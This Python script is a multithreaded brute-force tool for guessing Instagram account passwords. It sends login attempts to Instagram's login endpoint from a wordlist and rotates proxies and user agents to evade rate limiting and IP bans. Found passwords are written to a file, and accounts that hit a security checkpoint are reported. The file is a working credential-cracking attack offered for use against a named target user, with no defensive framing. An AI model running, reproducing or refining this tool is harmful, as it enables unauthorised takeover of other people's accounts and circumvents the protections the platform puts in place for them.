import urllib.request as rq
import random
import urllib.parse as http_parser
import argparse
import time
import socket
import threading
import traceback
import re
from urllib.error import HTTPError
import sys
import os

try:
    import Queue
except ImportError:
    import queue as Queue

THREAD = 50




class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'





def extract_csrf_token(text):

  page_text = str(text)

  result = page_text.find("csrf_token")
  after = page_text[result + len("csrf_token"):-1]


  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")

  if len(csrf_token) == 0:
    print ("[-] Error extraction CSRF token, exiting...")
    exit()
  else:

    print ("CSRF token is: " + csrf_token)
    return csrf_token



def craft_response(username, password, csrf_token, proxy):

  #if q.empty() and found_flag:
    #return


  user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
             "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
             "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
             "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"]

  URL = "https://www.instagram.com/accounts/login/ajax/"


  values = {
    'username': username,
    'enc_password': encode_password(password),
    'Ps': '',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
  }


  headers = {
    "Host": "www.instagram.com",
    #"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
    "User-Agent": random.choice(user_agents),
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-CSRFToken": csrf_token,
    "X-Instagram-AJAX": "1",
    "X-IG-WWW-Claim": "0",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://www.instagram.com",
    "Referer": "https://www.instagram.com/",
    "Cookie": "csrf_token=" + csrf_token
  }

  try:

    if proxy is not None:


      proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
      opener = rq.build_opener(proxy_support)
      rq.install_opener(opener)




    data = http_parser.urlencode(values)
    data = data.encode('ascii')
    req = rq.Request(URL, data, headers)



    with rq.urlopen(req) as response:
      the_page = response.read()

      #print (the_page)



      page_text = str(the_page)

      if "\"authenticated\": true" in page_text:

        print(bcolors.OKGREEN + "[+] Success! Password is: " + bcolors.BOLD + password + bcolors.ENDC + "\n")

        f = open("success_login.txt", "w")
        found_flag = True
        f.write(password)

        q.queue.clear()
        q.task_done()
        return

      elif "error" in page_text:
        # send response again
        #print ("Error in page text.." + password)
        #maybe put raise Exception here?
        #craft_response(username, password, csrf_token, random.choice(list(proxys_working_list.keys())))

        print("error in page_text")
        raise Exception("500")

      else:
        print ("Trying: " + "\"" + password + "\"" +"| FAILURE")

    
  except HTTPError as e:
    if e.getcode() == 400 or e.getcode() == 403:

        if "checkpoint_required" in e.read().decode("utf8", 'ignore'):
          print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
                  + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
          print("---------------------------------------------------")
          print("[!]Username: ", USER)
          print("[!]Password: ", password)
          print("---------------------------------------------------\n" + bcolors.ENDC)
          found_flag = True
          q.queue.clear()
          q.task_done()
          os._exit(1)
          return

        elif proxy:
            print(bcolors.WARNING +
                  "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
                  + bcolors.ENDC
                  )
            if proxy in proxys_working_list:
                proxys_working_list.pop(proxy)

            print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
            raise Exception(str(e.getcode()))
            


        else:
            print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
                  " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
            raise Exception(str(e.getcode()))
    else:
        #print("Error:", e.getcode())
        #print ("Http Error Bloc: " + str(e.getcode()))

        #This is causing a double exception -- raising an exception inside an exception!!
        raise Exception(str(e.getcode()))

        
    
  except Exception as err:
    #print ("LINE 194: " + str(err))
    raise Exception(str(err))
    
    

def encode_password(password):

  formatted_time = str(int(time.time()))

  enc_password = '#PWD_INSTAGRAM_BROWSER:0:' + formatted_time + ':' + password

  return enc_password

def is_bad_proxy(pip):    
    try:
        proxy_handler = rq.ProxyHandler({'http': pip})
        opener = rq.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)
        req=rq.Request('http://www.google.com')  # change the URL to test here
        sock=rq.urlopen(req)

    except Exception as detail:
        #print("ERROR:", detail)
        return True
    return False

def find_working_proxies(proxy_list):

  good_proxies = []

  for proxy in proxy_list:

    print (proxy)

    if not is_bad_proxy(proxy):
      good_proxies.append(proxy)

  return good_proxies

def check_avalaible_proxys(proxys):
    """
        check avalaible proxyies from proxy_list file
    """
    socket.setdefaulttimeout(30)

    print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)

    max_thread = THREAD

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)

    while not queue.empty():
        queuelock.acquire()
        for workers in range(max_thread):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()

    print(bcolors.OKGREEN + "[+] Online Proxy: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")

def check_proxy(q):
    """
    check proxy for and append to working proxies
    :param q:
    """
    if not q.empty():

        proxy = q.get(False)
        proxy = proxy.strip()


        try:
            
            is_working = False

            if not is_bad_proxy(proxy):
                proxys_working_list.update({proxy: proxy})
                p = open("good_proxies.txt", "a")
                p.write(proxy + "\n")
                p.close()

                print(bcolors.OKGREEN + " --[+] ", proxy, " | PASS" + bcolors.ENDC)

            else:
                print(" --[!] ", proxy, " | FAILED")
            
            

        except Exception as err:
            print(" --[!] ", proxy, " | FAILED | " + str(err)) 


def has_server_error(message):

  if (("403" in message) or ("429" in message) or ("onnection reset" in message)
            or ("50" in message) or ("timed out" in message) or ("30" in message)\
            or ("Remote end closed connection" in message) or ("violation of protocol" in message))\
            or ("400" in message) or ("403" in message):
    return True

  else:
    return False




def brute(q):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    if not q.empty():
        try:
            proxy = None

            if len(proxys_working_list) != 0:
                proxy = random.choice(list(proxys_working_list.keys()))

            word = q.get()
            word = word.replace("\r", "").replace("\n", "").strip()


            craft_response(username, word, csrf_token, proxy)

        except Exception as error:

          message = str(error)

          #Forbidden or Too Many Requests, try again until request is accepted

          #print(bcolors.WARNING + "[-] Error, retrying.. " + str(error) + bcolors.ENDC)

          # Look for server side error codes
          """
          if ("400" in message) or ("403" in message):
            #print ("400 Error, password is: " + word)
            #print (message)
            craft_response(username, word, csrf_token, random.choice(list(proxys_working_list.keys())))
          """


          i = 1

          while has_server_error(message):

            

            try:
              print("Attempt " + str(i), end="\r", flush=True)
              i += 1

              if len(proxys_working_list) != 0:
                proxy = random.choice(list(proxys_working_list.keys()))

              craft_response(username, word, csrf_token, proxy)
              message = "Passed"

            except Exception as e:
              message = str(e)
              #print ("TEST: " + message)
              #return 0
          print("Client side error: " + message)
            

        



            
def starter():
    """
    threading workers initialize
    """
    global found_flag

    queue = Queue.Queue()
    threads = []
    max_thread = THREAD
    found_flag = False

    queuelock = threading.Lock()

    print(bcolors.HEADER + "\n[!] Initializing Workers")
    print("[!] Start Cracking ... \n" + bcolors.ENDC)

    try:
        for word in words:
            queue.put(word)
        while not queue.empty():
            queuelock.acquire()
            for workers in range(max_thread):
                t = threading.Thread(target=brute, args=(queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
            if found_flag:
                break
        print(bcolors.OKGREEN + "\n--------------------")
        print("[!] Brute complete !" + bcolors.ENDC)

    except Exception as err:
        print(err)

def get_csrf():

  global csrf_token
  csrf_token = ""


  #Keep making requests until a csrf token is acquired 
  print(bcolors.WARNING + "[-] Extracting CSRF Token...\n" + bcolors.ENDC)

  while len(csrf_token) == 0:
    try:


      proxy_support = rq.ProxyHandler({'https': 'https://' + random.choice(list(proxys_working_list.keys()))})
      opener = rq.build_opener(proxy_support)
      rq.install_opener(opener)

      response = rq.urlopen('http://www.instagram.com')
      html = response.read()

      csrf_token = extract_csrf_token(html)
    except Exception as e:
      #try again
      pass

  print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)



def extract_csrf_token(text):

  page_text = str(text)

  result = page_text.find("csrf_token")
  after = page_text[result + len("csrf_token"):-1]


  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")

  if len(csrf_token) == 0:
    print ("[-] Error extraction CSRF token, exiting...")
    exit()
  else:

    #print ("CSRF token is: " + csrf_token)
    return csrf_token






if __name__ == "__main__":


  global proxys_working_list

  proxys_working_list = {}

  # Parse args
  parser = argparse.ArgumentParser(
        description="Instagram BruteForce Script",
        epilog="python angel_brute.py -u user_test -w words.txt -p proxies.txt"
    )

  # required argument
  parser.add_argument('-u', '--username', action="store", required=True,
                  help='Target Username')
  parser.add_argument('-w', '--word', action="store", required=True,
                  help='Words list path')
  parser.add_argument('-p', '--proxy', action="store", required=False,
                        help='Proxy list path')

  args = parser.parse_args()

  USER = args.username
  global username
  username = USER

  try:
      #words = open(args.word).readlines()
      words = re.findall('\w+', open(args.word, encoding='latin-1').read().lower())
  except IOError:
      print("[-] Error: Check your word list file path\n")
      sys.exit(1)

  if args.proxy is not None:

    try:
      proxies = open(args.proxy).readlines()
    except IOError:
        print("[-] Error: Check your proxy list file path\n")
        sys.exit(1)

    check_avalaible_proxys(proxies)





  
  get_csrf()
  starter()






